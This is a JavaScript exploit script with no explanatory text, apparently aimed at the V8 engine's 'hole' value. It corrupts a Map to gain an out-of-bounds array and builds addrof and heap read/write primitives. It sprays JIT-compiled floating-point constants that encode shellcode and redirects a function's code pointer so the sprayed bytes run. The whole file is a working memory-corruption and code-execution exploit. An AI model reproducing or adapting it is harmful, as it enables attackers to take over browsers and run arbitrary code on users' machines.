ab = new ArrayBuffer(8);
f64 = new Float64Array(ab);
B64 = new BigInt64Array(ab);
function ftoi(f) {
    f64[0] = f;
    return B64[0];
}

function itof(i) {
    B64[0] = i;
    return f64[0];
}
function trigger() {
    let a = [1, 2, 3];
    return a.hole();
}
function foo() {
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {
	foo();foo();foo();foo();
}
let hole = trigger();
var map = new Map();
map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);
oob_arr = [1.1, 1.1, 1.1, 1.1];
victim_arr = [2.2, 2.2, 2.2, 2.2];
obj_arr = [{}, {}, {}, {}];
map.set(0x1b, -1);
map.set(0x10f, 0);
data = ftoi(oob_arr[13]);
ori_victim_arr_elem = (data & 0xffffffff00000000n) >> 32n;
element_kind = data & 0xffffffffn;
function addrof(o) {
    oob_arr[13] = itof( (ori_victim_arr_elem << 32n) | element_kind );
    oob_arr[24] = itof( (ori_victim_arr_elem << 32n) | element_kind );
    obj_arr[0] = o;
    return ftoi(victim_arr[0]) & 0xffffffffn;
}
function heap_read64(addr) {
    oob_arr[13] = itof( ((addr-0x8n) << 32n) | element_kind );
    return ftoi(victim_arr[0]);
}
function heap_write64(addr, val) {
    oob_arr[13] = itof( ((addr-0x8n) << 32n) | element_kind );
    victim_arr[0] = itof(val);
}
foo_addr = addrof(foo);
code_addr = heap_read64(foo_addr+0x18n) & 0xffffffffn;
jit_addr = heap_read64(code_addr+0xcn);
console.log(foo_addr.toString(16));
console.log(code_addr.toString(16));
console.log(jit_addr.toString(16));
heap_write64(code_addr+0xcn, jit_addr+0x7cn);
foo();
